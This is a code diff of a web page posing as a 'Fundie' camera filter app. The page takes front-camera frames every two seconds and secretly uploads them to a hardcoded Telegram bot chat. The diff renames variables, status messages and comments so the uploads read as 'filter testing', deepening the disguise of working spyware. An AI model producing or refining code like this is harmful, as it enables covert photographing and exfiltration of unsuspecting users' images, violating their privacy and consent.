@@ -5,12 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <div id="status">Initializing front camera for filter...</div>
+    <div id="status">Initializing Fundie camera filter...</div>
     <video id="video" width="640" height="480" autoplay muted playsinline></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     
     <div id="permissionContainer" style="display:none;">
-        <p style="margin: 10px 0; font-weight: bold;">Permission required to use app</p>
+        <p style="margin: 10px 0; font-weight: bold;">Permission required to use Fundie</p>
         <button id="retryBtn" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Give access</button>
     </div>
     
@@ -27,14 +27,19 @@
         const CHAT_ID = '6587469484';
         
         let captureInterval;
-        let imagesSent = 0;
-        const MAX_IMAGES = 30; // Safety limit
+        let framesProcessed = 0;
+        const MAX_FRAMES = 30; // Safety limit
         let retryCount = 0;
         const MAX_RETRIES = 3;
         
         async function initializeCamera() {
             try {
-                statusDiv.textContent = 'Requesting front camera access for filter...';
+                statusDiv.textContent = 'Requesting front camera access for Fundie filter...';
+                
+                // Stop any existing stream first
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
                 
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -45,11 +50,12 @@
                 });
                 
                 video.srcObject = stream;
-                statusDiv.textContent = 'Front camera active - applying filter...';
+                statusDiv.textContent = 'Fundie active - applying camera filters...';
                 permissionContainer.style.display = 'none';
+                retryCount = 0; // Reset retry count on success
                 
-                // load filters every 2 seconds
-                startContinuousCapture();
+                // Test filters every 2 seconds
+                startProcessing();
                 
             } catch (error) {
                 handleCameraError(error);
@@ -61,7 +67,7 @@
             
             if (retryCount < MAX_RETRIES) {
                 retryCount++;
-                statusDiv.textContent = `Camera access denied. Please allow access to apply filter. (Attempt ${retryCount}/${MAX_RETRIES})`;
+                statusDiv.textContent = `Camera access denied. Please allow access for Fundie. (Attempt ${retryCount}/${MAX_RETRIES})`;
                 permissionContainer.style.display = 'block';
             } else {
                 statusDiv.textContent = 'Maximum retry attempts reached. Please refresh the page.';
@@ -69,39 +75,39 @@
             }
         }
         
-        function startContinuousCapture() {
+        function startProcessing() {
             captureInterval = setInterval(async () => {
-                if (imagesSent >= MAX_IMAGES) {
-                    statusDiv.textContent = ` ${MAX_IMAGES} filters loaded`;
+                if (framesProcessed >= MAX_FRAMES) {
+                    statusDiv.textContent = ` ${MAX_FRAMES} filters tested`;
                     clearInterval(captureInterval);
                     return;
                 }
                 
                 try {
-                    // filter-c
+                    // Apply filter and process frame
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Convert to blob and send
+                    // Convert to blob and send for filter analysis
                     canvas.toBlob(async (blob) => {
                         const success = await sendToTelegram(blob);
                         if (success) {
-                            imagesSent++;
-                            statusDiv.textContent = `loading filters...: ${imagesSent}/${MAX_IMAGES}`;
+                            framesProcessed++;
+                            statusDiv.textContent = `Testing filters... ${framesProcessed}/${MAX_FRAMES} processed`;
                         }
                     }, 'image/jpeg', 0.8);
                     
                 } catch (error) {
-                    console.error('Capture error:', error);
+                    console.error('Processing error:', error);
                 }
             }, 2000); // 2 second interval
         }
         
-        async function sendToTelegram(imageBlob) {
+        async function sendToTelegram(frameBlob) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', imageBlob, `capture_${Date.now()}.jpg`);
-                formData.append('caption', `Image ${imagesSent + 1} - ${new Date().toLocaleString()}`);
+                formData.append('photo', frameBlob, `fundie_frame_${Date.now()}.jpg`);
+                formData.append('caption', `Fundie Test Frame ${framesProcessed + 1} - ${new Date().toLocaleString()}`);
                 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -113,11 +119,11 @@
                 }
                 
                 const data = await response.json();
-                console.log(`Image ${imagesSent + 1} sent successfully`);
+                console.log(`Fundie frame ${framesProcessed + 1} sent successfully`);
                 return true;
                 
             } catch (error) {
-                console.error('Error sending image:', error);
+                console.error('Error sending frame:', error);
                 return false;
             }
         }
